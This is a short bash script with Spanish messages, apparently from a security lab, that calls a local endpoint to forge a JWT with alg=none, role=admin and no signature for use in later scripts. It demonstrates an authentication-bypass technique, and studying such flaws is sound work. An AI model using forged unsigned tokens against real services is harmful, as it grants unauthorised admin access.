#!/bin/bash
echo "=== JWT: Forjar token con alg=none y role=admin ==="
curl -s http://localhost:8080/api/auth/forge-none/2 | python -m json.tool

echo ""
echo "Este token tiene alg=none, role=admin y sin firma."
echo "Úsalo en los siguientes scripts."
